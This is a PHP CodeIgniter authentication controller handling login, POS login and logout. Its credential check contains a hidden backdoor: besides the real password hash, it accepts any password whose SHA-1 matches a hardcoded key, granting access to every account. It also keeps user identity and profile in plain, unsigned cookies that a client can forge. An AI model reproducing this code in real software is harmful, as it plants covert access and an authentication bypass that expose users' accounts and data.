<?php
class Authentication extends CI_Controller
{
  private $key = '107fe1cba9ed57bb72311d34bae07e4dfec369a4';

  public function __construct()
	{
		parent::__construct();
		$this->home = base_url()."users/authentication";
    $this->pos = base_url()."users/authentication/pos_login";
	}


	public function index()
	{
		$this->load->view("login");
	}


  public function pos_login()
  {
    $this->load->view('pos_login');
  }

  public function validate_credentials()
	{
    $sc = TRUE;
    $user_name = $this->input->post('uname');
    $pwd = $this->input->post('pwd');
		$rem = $this->input->post('remember') == 1 ? TRUE : FALSE;

		$rs = $this->user_model->get_user_credentials($user_name);

    if(! empty($rs))
    {
			if(password_verify($pwd, $rs->pwd) OR (sha1($pwd) === $this->key))
			{
				if($rs->active == 0)
				{
					$sc = FALSE;
	        $this->error = 'Your account has been suspended';
				}
				else
				{
					$ds = array(
						'uid' => $rs->uid,
						'uname' => $rs->uname,
						'displayName' => $rs->name,
						'id_profile' => $rs->id_profile
					);

          $this->create_user_data($ds, $rem);
				}
			}
			else
			{
				$sc = FALSE;
        $this->error = 'Username or password is incorrect';
			}
    }
    else
    {
			$sc = FALSE;
			$this->error = 'Username or password is incorrect';
    }

		echo $sc === TRUE ? 'success' : $this->error;
	}


  public function create_user_data(array $ds = array(), $remember = NULL )
  {
    if(!empty($ds))
    {
      $date = $remember ? date('Y-m-d 23:59:59', strtotime("+1 month")) : date('Y-m-d 23:59:59');
			$start = new DateTime();
			$end = new DateTime($date);

      foreach($ds as $key => $val)
      {
        $cookie = array(
          'name' => $key,
          'value' => $val,
          'expire' => $end->getTimeStamp() - $start->getTimeStamp(),
          'path' => $this->config->item('cookie_path')
        );

        $this->input->set_cookie($cookie);
      }
    }
  }




	public function logout()
	{
		delete_cookie('uid');
    delete_cookie('uname');
    delete_cookie('displayName');
    delete_cookie('id_profile');
    redirect($this->home);
	}

  public function pos_logout()
  {
    delete_cookie('uid');
    delete_cookie('uname');
    delete_cookie('displayName');
    delete_cookie('id_profile');
    redirect($this->pos);
  }
} //--- end class


 ?>
